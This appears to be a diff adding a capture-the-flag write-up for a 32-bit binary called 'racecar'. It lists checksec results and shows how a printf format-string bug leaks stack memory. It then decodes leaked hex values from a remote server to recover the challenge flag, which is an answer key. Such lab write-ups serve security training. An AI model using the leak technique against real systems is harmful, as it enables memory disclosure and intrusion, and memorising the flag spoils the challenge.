@@ -1,0 +1,24 @@
+Output of the file racecar:
+racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped
+
+Output of the checksec:
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	    Symbols		FORTIFY	Fortified	Fortifiable	FILE
+Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   96 Symbols	No      0	        3		    racecar
+
+Findings in Decompiler:
+Functions of concern were main(), car_info() {not much details}, car_menu(){ The function of concern }
+
+[+] After passing the true parameters to the executed binary, it checks for the file named flag.txt which on failing produces the message "Could not open flag.txt. Please contact the creator". 
+[+] On creation of file flag.txt, it accepts string and uses printf() to output the following which seems to be vulnerable.
+[+] After test the suspected format string vulnerability is confirmed, it can be exploited using the format string attack
+[+] Created a file named flag.txt and filled it with aaaaaaaa which translates to 0x61616161 easy to look for and that's where the pointer starts to leak
+[+] 0xf7c5000a 0xa7597800 0x565a7d58 0x565a9f8c 0xffa7d408 0x565a738d 0x565a7540 0x57e061a0 0x2 0xa7597800 0xf7f0a4b0 0x565a9f8c 0xffa7d428 0x565a7441 0xffa7d450 0xf7f0a688 0xf7f0ab70
+[+] The above output was generated on local host
+[+] After pushing the payload on server, the addresses produced were:
+[+] 0x567f51c0 0x170 0x565b4dfa 0x4f 0x5 0x26 0x2 0x1 0x565b596c 0x567f51c0 0x567f5340 0x7b425448 0x5f796877 0x5f643164 0x34735f31 0x745f3376 0x665f3368 0x5f67346c 0x745f6e30 0x355f3368 0x6b633474 0x7d213f 0x8276df00 0xf7f223fc 0x565b7f8c 0xff9cc7d8 0x565b5441 0x1 0xff9cc884 0xff9cc88c
+[+] Converting the above to bytes gave the following gibberish:
+[+] b'p\x01\x00\x00\xfaM[VO\x00\x00\x00\x05\x00\x00\x00&\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00lY[V\xc0Q\x7fV@S\x7fVHTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}\x00\x00\xdfv\x82\xfc#\xf2\xf7\x8c\x7f[V\xd8\xc7\x9c\xffAT[V\x01\x00\x00\x00\x84\xc8\x9c\xff\x8c\xc8\x9c\xff'
+[+] On examining the above we found the flag!!
+[+] The offset was at 12, so we can elliminate the front 11 hex!! for decoding
+
+
